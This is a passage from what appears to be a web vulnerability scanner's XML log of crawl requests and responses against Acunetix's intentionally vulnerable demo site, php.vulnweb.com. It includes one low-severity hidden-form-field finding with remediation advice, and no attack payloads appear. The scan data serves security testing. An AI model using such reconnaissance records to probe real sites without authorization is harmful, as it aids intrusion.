    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="576BAD0E7F0040BE9A90FAB7AD0E6559"><Method>GET</Method><Path>/</Path><File>listproducts</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>artist=2</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>artist</Name><Value>2</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/artists.php?artist=2</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="576BAD0E7F0040BE9A90FAB7AD0E6559";PSID="C8A66BC9CE97EE743AAB0212AA76B188";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="d4bc8aad";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="db313491";sc="1";tid="37";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>pictures</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>Blad3</h2><div class='story'><a href='product.php?pic=7'><h3>Trees</h3></a><p><a href='showimage.php?file=./pictures/7.jpg' target='_blank'><img style='cursor:pointer' border='0' align='left' src='showimage.php?file=./pictures/7.jpg&size=160' width='160' height='100'></a>bla bla bla</p><p>painted by: <a href='artists.php?artist=2'>Blad3</a></p><p><a href='#' onClick="window.open('./comment.php?pid=7','comment','width=500,height=400')">comment on this picture</a></p></div></div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:50 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>5193</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="389A9B1071787426A324931DF5CCE7B7"><URL>http://php.vulnweb.com:80/listproducts.php?artist=3</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="389A9B1071787426A324931DF5CCE7B7"><![CDATA[GET /listproducts.php?artist=3 HTTP/1.1
Referer: http://php.vulnweb.com/artists.php?artist=3
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="389A9B1071787426A324931DF5CCE7B7";PSID="3607E7419B6AF8069179E2E6CB83DB8B";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="7d874fa9";
X-Request-Memo: ID="80cc0e5f";sc="1";tid="38";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:50 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 4699

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>pictures</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="389A9B1071787426A324931DF5CCE7B7"><Method>GET</Method><Path>/</Path><File>listproducts</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>artist=3</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>artist</Name><Value>3</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/artists.php?artist=3</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="389A9B1071787426A324931DF5CCE7B7";PSID="3607E7419B6AF8069179E2E6CB83DB8B";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="7d874fa9";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="80cc0e5f";sc="1";tid="38";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>pictures</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:50 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>4699</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="DAA15E1D8773467EA7B95E6749B18163"><URL>http://php.vulnweb.com:80/product.php?pic=1</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="fda3f86f-ca69-4a26-bbdb-3e96705668f1"><CheckTypeID>Info</CheckTypeID><EngineType>CUSTOM</EngineType><AttackHTTPRequest /><VulnerabilityID>4727</VulnerabilityID><Severity>0</Severity><Name>Hidden Form Value</Name><Classifications><Classification kind="CWE" identifier="CWE-472" href="http://cwe.mitre.org/data/definitions/472.html">CWE-472: External Control of Assumed-Immutable Web Parameter</Classification><Classification kind="7PK" identifier="Encapsulation" href="https://vulncat.fortify.com/">Encapsulation</Classification><Classification kind="7PK Category" identifier="Hidden Field" href="https://vulncat.fortify.com/">Hidden Field</Classification></Classifications><DetectionSelection><Location offset="3727" length="5" /><Location offset="3797" length="7" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[While preventing display of information on the web page itself, the information submitted via hidden form fields is easily accessible, and could give an attacker valuable information that would prove helpful in escalating his attack methodology. 
Recommendations include not relying on hidden form fields as a security solution for any area of the web application that contains sensitive information or access to privileged functionality such as remote site administration functionality.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />The greatest danger from exploitation of a hidden form field design vulnerability is that the attacker will gain information that will help in orchestrating a far more dangerous attack.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br /><br />Any attacker could bypass a hidden form field security solution by viewing the source code of that particular page.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br />Do not rely on hidden form fields as a method of passing sensitive information or maintaining session state.  One workable bypass is to encrypt the hidden values in a form, and then decrypt them when that information is to be utilized by a database operation or a script. From a security standpoint, the best method of temporarily storing information required by different forms is to utilize a session cookie. <br /><br />
Whether hidden or not, if your site utilizes values submitted via a form to construct database queries, do not make the assumption that the data is non-malicious. Instead, utilize the following recommendations to sanitize user supplied input.
<br /><br /><ul><li>Stringently define the data type (for instance, a string, an alphanumeric character, etc) that the application will accept. </li><br /><br /><li>Use what is good instead of what is bad. </li><br /><br /><li>Validate input for improper characters. </li><br /><br /><li>Do not display error messages to the end user that provide information (such as table names) that could be utilized in orchestrating an attack. </li><br /><br /><li>Define the allowed set of characters. For instance, if a field is to receive a number, only let that field accept numbers. </li><br /><br /><li>Define the maximum and minimum data lengths for what the application will accept. </li><br /><br /><li>Specify acceptable numeric ranges for input. </li></ul>]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText /></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[While preventing display of information on the web page itself, the information submitted via hidden form fields is easily accessible, and could give an attacker valuable information that would prove helpful in escalating his attack methodology. Recommendations include not relying on hidden form fields as a security solution for any area of the web application that contains sensitive information or access to privileged functionality such as remote site administration functionality.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[Low]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[The greatest danger from exploitation of a hidden form field design vulnerability is that the attacker will gain information that will help in orchestrating a far more dangerous attack.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[Low]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[Any attacker could bypass a hidden form field security solution by viewing the source code of that particular page.]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[Low]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed at a convenient time.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Do not rely on hidden form fields as a method of passing sensitive information or maintaining session state.  One workable bypass is to encrypt the hidden values in a form, and then decrypt them when that information is to be utilized by a database operation or a script. From a security standpoint, the best method of temporarily storing information required by different forms is to utilize a session cookie. 
<br /><br />
Whether hidden or not, if your site utilizes values submitted via a form to construct database queries, do not make the assumption that the data is non-malicious. Instead, utilize the following recommendations to sanitize user supplied input.
<ul><li>Stringently define the data type (for instance, a string, an alphanumeric character, etc) that the application will accept. </li><li>Use what is good instead of what is bad. </li><li>Validate input for improper characters. </li><li>Do not display error messages to the end user that provide information (such as table names) that could be utilized in orchestrating an attack. </li><li>Define the allowed set of characters. For instance, if a field is to receive a number, only let that field accept numbers. </li><li>Define the maximum and minimum data lengths for what the application will accept. </li><li>Specify acceptable numeric ranges for input. </li></ul>

ASP.NET provides the Session object to store arbitrary application data that will be preserved across HTTP requests for a given user. You can store strings or arbitrarily complex objects as well.<br /><br />
C# examples:<br /><br />
  Session["myvar"] = "value";                 // Store a value<br />
  string value = Session["myvar"].ToString(); // Retrieve a value<br /><br />
VB.NET examples:<br /><br />
  Session.Item("myvar") = "value"            ' Store a value<br />
  Dim value As String = Session.Item("myvar").ToString() ' Retrieve a value
<br /><br />
Be sure to configure the <sessionstate> element in your web.config correctly. There are a number of options to control where the state is stored, whether it is shared across a web farm, and so on. Consult MSDN for details.
</sessionstate>]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />
Do not rely on hidden form fields as a method of passing sensitive information or maintaining session state. One workable bypass is to encrypt the hidden values in a form, and then decrypt them when that information is to be used by a database operation or a script. From a security standpoint, the best method of temporarily storing information required by different forms is to use a session cookie. <br /><br />
Whether hidden or not, if your site uses values submitted via a form to construct database queries, do not make the assumption that the data is non-malicious. Instead, use the following recommendations to sanitize user supplied input. 
<ul><li>Stringently define the data type (a string, an alphanumeric character, etc) that the application will accept. </li><li>Use what is good instead of what is bad. </li><li>Validate input for improper characters. </li><li>Do not display error messages to the end user that provide information (such as table names) that could be used in orchestrating an attack. </li><li>Define the allowed set of characters. For instance, if a field is to receive a number, allow that field to accept only numbers. </li><li>Define the maximum and minimum data lengths that the application will accept. </li><li>Specify acceptable numeric ranges for input. </li></ul>
The Java 2 Platform, Enterprise Edition (J2EE) platform provides the Session object to store arbitrary application data that will be preserved across HTTP requests for a given user. You can store strings or arbitrarily complex objects as shown below: <br /><br />
session.setAttribute(“myAttr”, “value”);   //Store a value<br />
